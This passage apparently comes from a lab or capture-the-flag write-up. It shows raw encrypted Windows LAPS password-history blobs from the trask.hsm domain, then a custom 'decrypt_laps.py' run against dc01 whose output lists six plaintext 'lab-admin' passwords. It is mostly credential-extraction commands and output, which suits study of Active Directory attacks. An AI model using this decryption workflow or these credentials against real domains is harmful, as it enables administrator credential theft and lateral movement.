xbc+Uh\x13\xde\xf5\xa4P\xe2\x98-\xe9e$\x93\xd9\x9f\xe8\xc0m\x96\xe3\x8b\x12\x18\xfc:f\x13w=\x11v\xcb\x0b\xf4\xd9F0+\x06\t*\x86H\x86\xf7\r\x01\x07\x010\x1e\x06\t`\x86H\x01e\x03\x04\x01.0\x11\x04\x0c\xea\xb3\x9d+\xf2\xc2u[\xdb5\xe6x\x02\x01\x10\xfe]\x1c\xc3$\xe1\x85\xb8\xbe\xb9K+\x8e\x87\x80R0\xe0J\xb0(\xb0,O\xd3\xeb\xc1W\xdf#/\x9bP\xfb\xbc\x9d\xe0\x85\xc7\xebp\xb4\x9aF\xcc\x1d\x10i\x19\x1bh\xbbi\x9c\x14\x1aB\x18\x1a \x8f\x93d\xd6t\xe9p\x9f\xd9J#\xa8\xe6\x94\xf1t\xd1\xe1uW\xa7l\xeaL\xf4\xc2\x86\xde\x80\x11%\x9ccgen\xee\x8e\xe8N|.j\x88\x9f>\xce\xd6\xdc\r\xb1\xb4\xbdq\x17\x06\x1d\x9f\x8b\xb6K\xe7<\x1c\x8b\x98\xa8\x8e(\xd5\xd8\xa1&)', b'k\xaa\xdc\x01J\x98{\xee\xcf\x04\x00\x00\x00\x00\x00\x000\x82\x04E\x06\t*\x86H\x86\xf7\r\x01\x07\x03\xa0\x82\x0460\x82\x042\x02\x01\x021\x82\x03\xfe\xa2\x82\x03\xfa\x02\x01\x040\x82\x03\xbc\x04\x82\x03d\x01\x00\x00\x00KDSK\x03\x00\x00\x00k\x01\x00\x00\x1e\x00\x00\x00\x14\x00\x00\x00l\xd0\xbe\n\xd3\xd4\xda^szX\xbf\x85\n\x88\xea\x08\x03\x00\x00\x14\x00\x00\x00\x14\x00\x00\x00DHPB\x00\x01\x00\x00\x87\xa8\xe6\x1d\xb4\xb6f<\xff\xbb\xd1\x9ce\x19Y\x99\x8c\xee\xf6\x08f\r\xd0\xf2],\xee\xd4C^;\x00\xe0\r\xf8\xf1\xd6\x19W\xd4\xfa\xf7\xdfEa\xb2\xaa0\x16\xc3\xd9\x114\to\xaa;\xf4)m\x83\x0e\x9a| \x9e\x0cd\x97Qz\xbdZ\x8a\x9d0k\xcfg\xed\x91\xf9\xe6r[GX\xc0"\xe0\xb1\xefBu\xbf{l[\xfc\x11\xd4_\x90\x88\xb9A\xf5N\xb1\xe5\x9b\xb8\xbc9\xa0\xbf\x120\x7f\\O\xdbp\xc5\x81\xb2?v\xb6:\xca\xe1\xca\xa6\xb7\x90-RRg5H\x8a\x0e\xf1<m\x9aQ\xbf\xa4\xab:\xd84w\x96RM\x8e\xf6\xa1g\xb5\xa4\x18%\xd9g\xe1D\xe5\x14\x05d%\x1c\xca\xcb\x83\xe6\xb4\x86\xf6\xb3\xca?yqP`&\xc0\xb8W\xf6\x89\x96(V\xde\xd4\x01\n\xbd\x0b\xe6!\xc3\xa3\x96\nT\xe7\x10\xc3u\xf2cu\xd7\x01A\x03\xa4\xb5C0\xc1\x98\xaf\x12a\x16\xd2\'n\x11q_i8w\xfa\xd7\xef\t\xca\xdb\tJ\xe9\x1e\x1a\x15\x97?\xb3,\x9bs\x13M\x0b.wPf`\xed\xbdHL\xa7\xb1\x8f!\xef T\x07\xf4y:\x1a\x0b\xa1%\x10\xdb\xc1Pw\xbeF?\xffO\xedJ\xac\x0b\xb5U\xbe:l\x1b\x0ckG\xb1\xbc7s\xbf~\x8cob\x90\x12(\xf8\xc2\x8c\xbb\x18\xa5Z\xe3\x13A\x00\ne\x01\x96\xf91\xc7zW\xf2\xdd\xf4c\xe5\xe9\xec\x14Kw}\xe6*\xaa\xb8\xa8b\x8a\xc3v\xd2\x82\xd6\xed8d\xe6y\x82B\x8e\xbc\x83\x1d\x144\x8fo/\x91\x93\xb5\x04Z\xf2vqd\xe1\xdf\xc9g\xc1\xfb?.U\xa4\xbd\x1b\xff\xe8;\x9c\x80\xd0R\xb9\x85\xd1\x82\xea\n\xdb*;s\x13\xd3\xfe\x14\xc8HK\x1e\x05%\x88\xb9\xb7\xd2\xbb\xd2\xdf\x01a\x99\xec\xd0n\x15W\xcd\t\x15\xb35;\xbbd\xe0\xec7\x7f\xd0(7\r\xf9+R\xc7\x89\x14(\xcd\xc6~\xb6\x18KR=\x1d\xb2F\xc3/c\x07\x84\x90\xf0\x0e\xf8\xd6G\xd1H\xd4yTQ^#\'\xcf\xef\x98\xc5\x82fKL\x0fl\xc4\x16YZ\x80\xee\xd4\xaf\x19H\x1eT\xff\x08\x9b\x07oX\x9fOG\xa6\xbe\xe8d\x8f\xee\xb7\xba\xf4\xa1\xae\xef\xd9\xac)\xe5\x1d\x97\x03\xab\xfb$^\xfa@\xf8\x04?0n1\x84B\x16\xf5\x9cR\xa0\x80\x9b<M&\x13\x04\x93\x8b\xee\xa9\x00Y\x0c\xa8\xb9\x1b\x98*h\xd6i\x95c\xd1u-\xef\xea\x91\xd0\x87\xf2\xd4\xdb#t\x80\x91\xe6\xc1\xce\xdb\xcc\xf8\xe2\xae\x9d\x81\x89zX\xf4w\xec\xca<\xfco\x01\xbe\xb0+\x8e\xd3}\xbb\x1a\xfbK\xd2\'\x81\xf2\x95\x81R\xe3\xaf\xcb\xb0\xfc|J\x9f\xff&\xdc\xe3\xe5b8\xd2\xdc\xbc\xc9H\xfa\x866\x1b\x13\x89F\x12\xebq\x97\x11\xb4A9i\xf5\x80\x95g\xd7\xaaN\xfc\xf3g|\x86\x80c\xc9\xb0\x1a\xb9\x12\xe1\xa7\x08\x8f4\\\x9c[\x18\xd2\xe6\x19\xf11r\x1c\xb4\xa7\xd3\xb3\x9cO\x03n\xd0\xb1&U\xd2\x19\x81\x1f\xf0\xf7(\xea\xf2\xe9\xad\xd2al\x825\xbb\xb8\xe7\xe6q)\xc9l\xce\x15\x00\xaa\x95$D\x1e2\xa5\r\xba\x82\xab@\xb1t\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x00t\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x000R\x06\t+\x06\x01\x04\x01\x827J\x010E\x06\n+\x06\x01\x04\x01\x827J\x01\x01070503\x0c\x03SID\x0c,S-1-5-21-939749445-4094954830-180080773-11110\x0b\x06\t`\x86H\x01e\x03\x04\x01-\x04(;\xf0\xf1\r\x1f,\\T/\xe5\xd1\x00\xe1\xd4\xa3}\xce\xcfX\x12\xd9\xb2\x1bh\x85\x86/\xa9W\xa6=\xe8\xf20\xf4\x85}=\x1f{0+\x06\t*\x86H\x86\xf7\r\x01\x07\x010\x1e\x06\t`\x86H\x01e\x03\x04\x01.0\x11\x04\x0cf\x1b\x10.\x9a\xfe\xa7\xfc\x16\xf1ym\x02\x01\x10\xbeT\xb0TW\xff\x9f\xccy\x05iY\xec\x1b\xbe\t\xdc\xe6\xacT\n\x05\xb2\xb3\x80oM\x8b\xb8\x9f\xa8\xc1]A\xa3\xa8\xaed\xfb\xf9a\x80\xe3\xc3K\x86\xf6\xd7\xe3fY\x92\xba\tQ\x8e9\xcf\xf8\x02\xdf\xc97\xf9\xb7\x94m\xc9q\x89E\x8e\xf6g\x1fa\xef\x0b\x90z\xe9.\x1d\xac\xbez\x94@J\x1b\xf9\x12\x96\xee\x82\x95\xb2\x16\x1e\xa1\xef\x14\xaf\xd207\xe5\x84_\x9c\x89x\xfd\xcak\xd3\x91.\xbeK\xd8\x03O$\xceo\x7f\xa3\xbd\xbf\xcb\xc7\xa4?', b'k\xaa\xdc\x01\xd2\x0bo\xda\xcf\x04\x00\x00\x00\x00\x00\x000\x82\x04E\x06\t*\x86H\x86\xf7\r\x01\x07\x03\xa0\x82\x0460\x82\x042\x02\x01\x021\x82\x03\xfe\xa2\x82\x03\xfa\x02\x01\x040\x82\x03\xbc\x04\x82\x03d\x01\x00\x00\x00KDSK\x03\x00\x00\x00k\x01\x00\x00\x1e\x00\x00\x00\x14\x00\x00\x00l\xd0\xbe\n\xd3\xd4\xda^szX\xbf\x85\n\x88\xea\x08\x03\x00\x00\x14\x00\x00\x00\x14\x00\x00\x00DHPB\x00\x01\x00\x00\x87\xa8\xe6\x1d\xb4\xb6f<\xff\xbb\xd1\x9ce\x19Y\x99\x8c\xee\xf6\x08f\r\xd0\xf2],\xee\xd4C^;\x00\xe0\r\xf8\xf1\xd6\x19W\xd4\xfa\xf7\xdfEa\xb2\xaa0\x16\xc3\xd9\x114\to\xaa;\xf4)m\x83\x0e\x9a| \x9e\x0cd\x97Qz\xbdZ\x8a\x9d0k\xcfg\xed\x91\xf9\xe6r[GX\xc0"\xe0\xb1\xefBu\xbf{l[\xfc\x11\xd4_\x90\x88\xb9A\xf5N\xb1\xe5\x9b\xb8\xbc9\xa0\xbf\x120\x7f\\O\xdbp\xc5\x81\xb2?v\xb6:\xca\xe1\xca\xa6\xb7\x90-RRg5H\x8a\x0e\xf1<m\x9aQ\xbf\xa4\xab:\xd84w\x96RM\x8e\xf6\xa1g\xb5\xa4\x18%\xd9g\xe1D\xe5\x14\x05d%\x1c\xca\xcb\x83\xe6\xb4\x86\xf6\xb3\xca?yqP`&\xc0\xb8W\xf6\x89\x96(V\xde\xd4\x01\n\xbd\x0b\xe6!\xc3\xa3\x96\nT\xe7\x10\xc3u\xf2cu\xd7\x01A\x03\xa4\xb5C0\xc1\x98\xaf\x12a\x16\xd2\'n\x11q_i8w\xfa\xd7\xef\t\xca\xdb\tJ\xe9\x1e\x1a\x15\x97?\xb3,\x9bs\x13M\x0b.wPf`\xed\xbdHL\xa7\xb1\x8f!\xef T\x07\xf4y:\x1a\x0b\xa1%\x10\xdb\xc1Pw\xbeF?\xffO\xedJ\xac\x0b\xb5U\xbe:l\x1b\x0ckG\xb1\xbc7s\xbf~\x8cob\x90\x12(\xf8\xc2\x8c\xbb\x18\xa5Z\xe3\x13A\x00\ne\x01\x96\xf91\xc7zW\xf2\xdd\xf4c\xe5\xe9\xec\x14Kw}\xe6*\xaa\xb8\xa8b\x8a\xc3v\xd2\x82\xd6\xed8d\xe6y\x82B\x8e\xbc\x83\x1d\x144\x8fo/\x91\x93\xb5\x04Z\xf2vqd\xe1\xdf\xc9g\xc1\xfb?.U\xa4\xbd\x1b\xff\xe8;\x9c\x80\xd0R\xb9\x85\xd1\x82\xea\n\xdb*;s\x13\xd3\xfe\x14\xc8HK\x1e\x05%\x88\xb9\xb7\xd2\xbb\xd2\xdf\x01a\x99\xec\xd0n\x15W\xcd\t\x15\xb35;\xbbd\xe0\xec7\x7f\xd0(7\r\xf9+R\xc7\x89\x14(\xcd\xc6~\xb6\x18KR=\x1d\xb2F\xc3/c\x07\x84\x90\xf0\x0e\xf8\xd6G\xd1H\xd4yTQ^#\'\xcf\xef\x98\xc5\x82fKL\x0fl\xc4\x16Yl\xaf+\x01\x80eI\x1c\x82q\xf9Ha\x92\x8cC>\xd5\xdf\xa0\xea\x05u\xdf(\x88\xcc\xd0k\x19)\x997\x01\xcb\r\x8e[\xfe\x83\x14\x0bb\x82]\x98\xe5\xea\xcf\xb7\xf4\xbb\xc6\xf4\xc2\xbd8}\x89\xa5\x8aC/\xa5\x04v\xaa\xa0\xe4{\x03\\\x13j1\xcdw\xb3\xec\x06\x91\xf1\xa6\xdb\x1e\xf9v\xe4\xaf$\xb0\x18\x94\xc1\x97\xcb@\x94\xf2\xa2\x01\xce\xc6\x96~\x98\xa6t\xd3=\xf0\xc2\xba\x04\x16\xb0\xa0d|s\xd1\xf0\x96f\x1f\xb7\xe0\xf9\xf2;\xe9\x08\xecs\xd9\xea]\x97\xb7\x8e\xb3\xe4uN\xf6c\x93\xb1/\xbc\xd6\xd9c\x03~\x1a\x10W\x0b\xe5\xfe\x16\xe7\x01V\xd8\x05\xaf\xaeWQ\xbd\xaa\x92@FH\x14\x87Q\xd9\xd7\x94WGl\x93G1\xcav\x95\xed\xa7>\x8d\xc2s\xb8p\xcc\x0er\x95\x81b|6\xc3\xca\xa3|\xceA\x88 R8\xdf\xe8e\x04\x93\xc7\xf4\xdaF\xe5\x8a\xc4\x85-\x04\xd4\x1a\xbd\x87\x86\x930\x9d\'\xfb,\xa7\xf0\xe0\xc4\x00m\xa9\x93\xd8a\x13ut\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x00t\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x000R\x06\t+\x06\x01\x04\x01\x827J\x010E\x06\n+\x06\x01\x04\x01\x827J\x01\x01070503\x0c\x03SID\x0c,S-1-5-21-939749445-4094954830-180080773-11110\x0b\x06\t`\x86H\x01e\x03\x04\x01-\x04(\x1fe\xcfj}\x12+\xce0\xeeR\xc7\'f\xf9\xa3\xc6\x9d\xa4\xf2\x95\xf4\xa0D\x17<\x17p\x8d\xd13p\x98\xae\x11\xec}W\x0560+\x06\t*\x86H\x86\xf7\r\x01\x07\x010\x1e\x06\t`\x86H\x01e\x03\x04\x01.0\x11\x04\x0c\x91\x94]6\x12~o/\x9e\xef\x99\x0b\x02\x01\x10%zE\x8b=K\xe6\xdf\x0fh\xac\x9dZ\xc3i\xf9\x03\xe1\xb15\xd8\xdc\xb5vG\xf0x\x89\xe0\xc7\x16\x1f\x07\x04\xeb\x86[|\xa2c\xe5VW\x8a\xb4\x9a@n\xe1G\x99\xcb:\xc3\xfcp\xda\xcd\xca)\xbfR+\xfer\x03|\xf9\x19\xd4\xd7m\xbdy@\xb3\x9en0\xd9\x03\xe4n\xa2Y\xe3\x89\xf8d\xd6\'k:\xec9\xc7b\x82;\xce\x05dWK*\xc7\xca\x1f\xf1\x83\x96\x05\x8d\x80T\x10\xd8*?\xf3\x02\xbe#\x8a\xd8\xe2\xc6\xfa5h\x15\x1f\t\xc8', b'k\xaa\xdc\x01S\x0f\xc1\xc6\xcf\x04\x00\x00\x00\x00\x00\x000\x82\x04E\x06\t*\x86H\x86\xf7\r\x01\x07\x03\xa0\x82\x0460\x82\x042\x02\x01\x021\x82\x03\xfe\xa2\x82\x03\xfa\x02\x01\x040\x82\x03\xbc\x04\x82\x03d\x01\x00\x00\x00KDSK\x03\x00\x00\x00k\x01\x00\x00\x1e\x00\x00\x00\x14\x00\x00\x00l\xd0\xbe\n\xd3\xd4\xda^szX\xbf\x85\n\x88\xea\x08\x03\x00\x00\x14\x00\x00\x00\x14\x00\x00\x00DHPB\x00\x01\x00\x00\x87\xa8\xe6\x1d\xb4\xb6f<\xff\xbb\xd1\x9ce\x19Y\x99\x8c\xee\xf6\x08f\r\xd0\xf2],\xee\xd4C^;\x00\xe0\r\xf8\xf1\xd6\x19W\xd4\xfa\xf7\xdfEa\xb2\xaa0\x16\xc3\xd9\x114\to\xaa;\xf4)m\x83\x0e\x9a| \x9e\x0cd\x97Qz\xbdZ\x8a\x9d0k\xcfg\xed\x91\xf9\xe6r[GX\xc0"\xe0\xb1\xefBu\xbf{l[\xfc\x11\xd4_\x90\x88\xb9A\xf5N\xb1\xe5\x9b\xb8\xbc9\xa0\xbf\x120\x7f\\O\xdbp\xc5\x81\xb2?v\xb6:\xca\xe1\xca\xa6\xb7\x90-RRg5H\x8a\x0e\xf1<m\x9aQ\xbf\xa4\xab:\xd84w\x96RM\x8e\xf6\xa1g\xb5\xa4\x18%\xd9g\xe1D\xe5\x14\x05d%\x1c\xca\xcb\x83\xe6\xb4\x86\xf6\xb3\xca?yqP`&\xc0\xb8W\xf6\x89\x96(V\xde\xd4\x01\n\xbd\x0b\xe6!\xc3\xa3\x96\nT\xe7\x10\xc3u\xf2cu\xd7\x01A\x03\xa4\xb5C0\xc1\x98\xaf\x12a\x16\xd2\'n\x11q_i8w\xfa\xd7\xef\t\xca\xdb\tJ\xe9\x1e\x1a\x15\x97?\xb3,\x9bs\x13M\x0b.wPf`\xed\xbdHL\xa7\xb1\x8f!\xef T\x07\xf4y:\x1a\x0b\xa1%\x10\xdb\xc1Pw\xbeF?\xffO\xedJ\xac\x0b\xb5U\xbe:l\x1b\x0ckG\xb1\xbc7s\xbf~\x8cob\x90\x12(\xf8\xc2\x8c\xbb\x18\xa5Z\xe3\x13A\x00\ne\x01\x96\xf91\xc7zW\xf2\xdd\xf4c\xe5\xe9\xec\x14Kw}\xe6*\xaa\xb8\xa8b\x8a\xc3v\xd2\x82\xd6\xed8d\xe6y\x82B\x8e\xbc\x83\x1d\x144\x8fo/\x91\x93\xb5\x04Z\xf2vqd\xe1\xdf\xc9g\xc1\xfb?.U\xa4\xbd\x1b\xff\xe8;\x9c\x80\xd0R\xb9\x85\xd1\x82\xea\n\xdb*;s\x13\xd3\xfe\x14\xc8HK\x1e\x05%\x88\xb9\xb7\xd2\xbb\xd2\xdf\x01a\x99\xec\xd0n\x15W\xcd\t\x15\xb35;\xbbd\xe0\xec7\x7f\xd0(7\r\xf9+R\xc7\x89\x14(\xcd\xc6~\xb6\x18KR=\x1d\xb2F\xc3/c\x07\x84\x90\xf0\x0e\xf8\xd6G\xd1H\xd4yTQ^#\'\xcf\xef\x98\xc5\x82fKL\x0fl\xc4\x16YxCR\xb1\xf3\xe5\xc1E\x96\xc4y\xa2]\xf7\x94\x14\x18\xa0\x9aQ\xbe\x83~\xf3\xc0j\xb0\xca\xa8dfQ\x0f\x8bM\xfc\xc2MmL\xf9z6\xd3*\x00\xce\x0c\xce\xb3\xb9@\xa1\n\xed\x97dJ\xbem\xe9\xa8\x9c\xf5\xa0\xec#{c\xa7\xbf]\xd1\x840\xde3K\x823x\x17/Ay\xe8\x10q\xeb&l\x87\xd2_\x8fU^\xba\xb9\x8fDM\xf9\x1a\xa8f\xbc\x089\n\x11\x95\t\x1a\xba\xc9yhG\xfc*\xee\x04\xeb@\xfcE\xb1\x98{?7e\xefN\xaam\xa8\xd0k\x9e\xae\xaa\xd0tv\x8c\xb4\xb1-?HU\x87q\xce5\x1e\xeb\xd1\xbe\xbcK\x01/B\x1c\xec\xa6A|\xe3\xe3\xefJd\x1c@g\x93\x98Y\xcf\xc9\xcdH\x0c=\x05>\xac.\xdcA\xe9q\xbfk\xf2\xda\xb7[\xe0\x12\x1d\xe8\xc3\xb7F\xec\xca\xe4\x1d\xd7\xea\xb7\xdbhq$\x1a\xda\x02\xa0\xb5\xa5\xe7\x0e\xeaV\x85\xd6\xf4&\xc0\x80\xd7\xd7q1?\x96\xf9\xfek\xbd\xaf\x98G|df@\xe58Tt\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x00t\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x000R\x06\t+\x06\x01\x04\x01\x827J\x010E\x06\n+\x06\x01\x04\x01\x827J\x01\x01070503\x0c\x03SID\x0c,S-1-5-21-939749445-4094954830-180080773-11110\x0b\x06\t`\x86H\x01e\x03\x04\x01-\x04(V\xe0l\xeb\x1e?Y\xc9\x13\xaeU\x88\xd6\xe7\xbd?\xf4Ht\x1cj\x8d\x1e\xb5H\\\x8b\x90U\x83\xd8\xdd\x9cmIN\x15\xb6\xba|0+\x06\t*\x86H\x86\xf7\r\x01\x07\x010\x1e\x06\t`\x86H\x01e\x03\x04\x01.0\x11\x04\x0c\xcc\xbc\x03\x9av\x81Y\xe2\x88\xc99\xbe\x02\x01\x10\xc2\xc1#\n\x93K0\x19i\x1eJ\x91\xa9\xc2UoS\xe8\xe9-\xba\x0f)\x8ej\x15\x17\x0e\xd1\x91\xc8M\x97!!\x9b^\xec\x17\xab6hF\xfcH\x1cE(\xef\xdce\xf6\xd9\x10\x9d\xf0\xd6\x7fu\xcbJ\xb2\xd4\xbf\xb1i\\\xf8]g\xd0fLd\xbc\xfb\x19\x83\xdb\xf3\x94\x91\xd1$\x17\x01]%UjQ^\xd2_!\xc0\x94\xe0\xa7\x9eC\xac\r\xea\xfapU\xea\xa97\xa5\xb1u[|\xde<\x0b\x7fh\xb5;\xe2\xda3\xc4JH^|]\x93\x13`', b'k\xaa\xdc\x01\x17\x08\x7f\x7f\xcf\x04\x00\x00\x00\x00\x00\x000\x82\x04E\x06\t*\x86H\x86\xf7\r\x01\x07\x03\xa0\x82\x0460\x82\x042\x02\x01\x021\x82\x03\xfe\xa2\x82\x03\xfa\x02\x01\x040\x82\x03\xbc\x04\x82\x03d\x01\x00\x00\x00KDSK\x03\x00\x00\x00k\x01\x00\x00\x1e\x00\x00\x00\x14\x00\x00\x00l\xd0\xbe\n\xd3\xd4\xda^szX\xbf\x85\n\x88\xea\x08\x03\x00\x00\x14\x00\x00\x00\x14\x00\x00\x00DHPB\x00\x01\x00\x00\x87\xa8\xe6\x1d\xb4\xb6f<\xff\xbb\xd1\x9ce\x19Y\x99\x8c\xee\xf6\x08f\r\xd0\xf2],\xee\xd4C^;\x00\xe0\r\xf8\xf1\xd6\x19W\xd4\xfa\xf7\xdfEa\xb2\xaa0\x16\xc3\xd9\x114\to\xaa;\xf4)m\x83\x0e\x9a| \x9e\x0cd\x97Qz\xbdZ\x8a\x9d0k\xcfg\xed\x91\xf9\xe6r[GX\xc0"\xe0\xb1\xefBu\xbf{l[\xfc\x11\xd4_\x90\x88\xb9A\xf5N\xb1\xe5\x9b\xb8\xbc9\xa0\xbf\x120\x7f\\O\xdbp\xc5\x81\xb2?v\xb6:\xca\xe1\xca\xa6\xb7\x90-RRg5H\x8a\x0e\xf1<m\x9aQ\xbf\xa4\xab:\xd84w\x96RM\x8e\xf6\xa1g\xb5\xa4\x18%\xd9g\xe1D\xe5\x14\x05d%\x1c\xca\xcb\x83\xe6\xb4\x86\xf6\xb3\xca?yqP`&\xc0\xb8W\xf6\x89\x96(V\xde\xd4\x01\n\xbd\x0b\xe6!\xc3\xa3\x96\nT\xe7\x10\xc3u\xf2cu\xd7\x01A\x03\xa4\xb5C0\xc1\x98\xaf\x12a\x16\xd2\'n\x11q_i8w\xfa\xd7\xef\t\xca\xdb\tJ\xe9\x1e\x1a\x15\x97?\xb3,\x9bs\x13M\x0b.wPf`\xed\xbdHL\xa7\xb1\x8f!\xef T\x07\xf4y:\x1a\x0b\xa1%\x10\xdb\xc1Pw\xbeF?\xffO\xedJ\xac\x0b\xb5U\xbe:l\x1b\x0ckG\xb1\xbc7s\xbf~\x8cob\x90\x12(\xf8\xc2\x8c\xbb\x18\xa5Z\xe3\x13A\x00\ne\x01\x96\xf91\xc7zW\xf2\xdd\xf4c\xe5\xe9\xec\x14Kw}\xe6*\xaa\xb8\xa8b\x8a\xc3v\xd2\x82\xd6\xed8d\xe6y\x82B\x8e\xbc\x83\x1d\x144\x8fo/\x91\x93\xb5\x04Z\xf2vqd\xe1\xdf\xc9g\xc1\xfb?.U\xa4\xbd\x1b\xff\xe8;\x9c\x80\xd0R\xb9\x85\xd1\x82\xea\n\xdb*;s\x13\xd3\xfe\x14\xc8HK\x1e\x05%\x88\xb9\xb7\xd2\xbb\xd2\xdf\x01a\x99\xec\xd0n\x15W\xcd\t\x15\xb35;\xbbd\xe0\xec7\x7f\xd0(7\r\xf9+R\xc7\x89\x14(\xcd\xc6~\xb6\x18KR=\x1d\xb2F\xc3/c\x07\x84\x90\xf0\x0e\xf8\xd6G\xd1H\xd4yTQ^#\'\xcf\xef\x98\xc5\x82fKL\x0fl\xc4\x16Y\x1c\xf8\xee\xcf\x00%\x1bS \x16L\x97\x00\x15\x97dV\x86>\xc8~\x9d\xd6\xe1\xdf\x1e!-T\xfd#\x10\x97 \xf84\xb1\xcd\x98\xda\x94l\xf0\t\xcaE^\x10\x16\xbaa\xf3\xe1\x9f\xb3\x99\x1c\xa0\xb2\xc5\x07\x1f\xb8z\xac\xe5\xc1\xecj\xe4\xd8\x15\x9d-\xef\xc8\xb1\x10p\x92\xe4\xdd\xf6fF\xf4\xb2\x1f>\x07\xcb\xccEv\xaer\x90\xf5\xb9\x80G\x0f\xca8\xb3c\xd1\xd0\x80\xdd\x12\xbb\xe6\x98wB\x15L\xd7\xeb\n\xde\xa9\x87W\xc3W\x97\x06\xb32\xed\x0b},\xf3\x97Q\xa7\x81\x95\xcb\xabZjy\x8f!K\xf8\xa4\xe7\xbc\xa1\xc5\x98\x04\x0b\xe7\x8atp\x16\x8f\xd8\xe1\xb0\x80\xbd\x8f\xc9\x85\rMyX\x0b\xd1\xef\x9dX/\xa1j\x80t\xbb\xc5\xb9\x13\x13\x01"\xd7w\xc9\x12DV\x83\xd5\xf5\xa3\xd9\xdeV\xb7R\xa4\x8b\xe5R\xb6\x99\x08\xfff\x81\xbc4V#1cpjX\xa9\x11\xee\xdd\xa3\xdc\xfdN\xb7\x08\xa8\x0c.\x19\x10\xcd\xc9j\x9f\xae\x82w8,\x97\x82\xd1!\xa0t\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x00t\x00r\x00a\x00s\x00k\x00.\x00h\x00s\x00m\x00\x00\x000R\x06\t+\x06\x01\x04\x01\x827J\x010E\x06\n+\x06\x01\x04\x01\x827J\x01\x01070503\x0c\x03SID\x0c,S-1-5-21-939749445-4094954830-180080773-11110\x0b\x06\t`\x86H\x01e\x03\x04\x01-\x04(\x95\x1b\xd5\xbe\xdf\xe9U\x1c\x05\xb8\xda\xa0\xf8?\x9bR\x9cST\xbd\xa6\x93\xd6Q$3w\xd1U\xe9Du} \r<=\xd1\xb0\xc60+\x06\t*\x86H\x86\xf7\r\x01\x07\x010\x1e\x06\t`\x86H\x01e\x03\x04\x01.0\x11\x04\x0c7\x15$k\xf9R\xc1\x01\xe7$?\xbd\x02\x01\x10aM^AX\xb2\xe6\x8ccVlE\xd57\x80\xd3\xa7x\x9f\xbcJ\xd5/\x96d\x1e\xf6\xf0\x1a/|\xb4H\xca\'\xd9\x91\x8c\xd9\x18\xe9\x7fRV\x89G.\x1d\xb5Q,O\xbf\xa9\x12\xcb\xd6X\x86\x82;)\x9f\xb8E\xbc\xd9!\xc3w\xd2\xfd\xc6)\xf8\xb3\x07\xa2\xf4\xd1\xae\x85/s\x0b\xbf8\xd72J\xe2\xce\xcc\xa9\x9c\xbc\\\xdeX\xa4\t\xfcm\xa4\x8f\xf7r}\xa2+\xd1$\x19\xfb\xba\x00\xad \xa8\xbc\xd2\x03:a\xb7\xbde413\xbd\x95\xe5\x93']
```

Now theyre in a file ill use my custom script

```python
python3 decrypt_laps.py -f lapspasswords.txt -s dc01.trask.hsm -k
[*] Found 6 blob(s) to process.
[1/6] ------------------------------------------------------------
    Blob size: 1247 bytes (header 16 + payload 1231)
    PasswordUpdateTimestamp: 2026-03-02 17:42:47 UTC
    Payload starts with: 3082044506092a86 (CMS SEQUENCE tag OK)
    [+] Account : lab-admin
    [+] Password: ([2};Ym7;FOJ
[2/6] ------------------------------------------------------------
    Blob size: 1247 bytes (header 16 + payload 1231)
    PasswordUpdateTimestamp: 2026-03-02 17:42:25 UTC
    Payload starts with: 3082044506092a86 (CMS SEQUENCE tag OK)
    [+] Account : lab-admin
    [+] Password: ,2SF5w#7]E8)
[3/6] ------------------------------------------------------------
    Blob size: 1247 bytes (header 16 + payload 1231)
    PasswordUpdateTimestamp: 2026-03-02 17:41:51 UTC
    Payload starts with: 3082044506092a86 (CMS SEQUENCE tag OK)
    [+] Account : lab-admin
    [+] Password: #u5Fnm5UD.uy
[4/6] ------------------------------------------------------------
    Blob size: 1247 bytes (header 16 + payload 1231)
    PasswordUpdateTimestamp: 2026-03-02 17:41:18 UTC
    Payload starts with: 3082044506092a86 (CMS SEQUENCE tag OK)
    [+] Account : lab-admin
    [+] Password: dO9#hhq)7g,k
[5/6] ------------------------------------------------------------
    Blob size: 1247 bytes (header 16 + payload 1231)
    PasswordUpdateTimestamp: 2026-03-02 17:39:19 UTC
    Payload starts with: 3082044506092a86 (CMS SEQUENCE tag OK)
    [+] Account : lab-admin
    [+] Password: 6zdAQFyJ!79k
[6/6] ------------------------------------------------------------
    Blob size: 1247 bytes (header 16 + payload 1231)
    PasswordUpdateTimestamp: 2026-03-02 17:43:08 UTC
    Payload starts with: 3082044506092a86 (CMS SEQUENCE tag OK)
    [+] Account : lab-admin
    [+] Password: /i!jkcVjs98!
==============================================================
[+] Decrypted 6/6 blob(s):
    2026-03-02 17:42:47 UTC  ->  ([2};Ym7;FOJ
    2026-03-02 17:42:25 UTC  ->  ,2SF5w#7]E8)
    2026-03-02 17:41:51 UTC  ->  #u5Fnm5UD.uy
    2026-03-02 17:41:18 UTC  ->  dO9#hhq)7g,k
    2026-03-02 17:39:19 UTC  ->  6zdAQFyJ!79k
    2026-03-02 17:43:08 UTC  ->  /i!jkcVjs98!
```

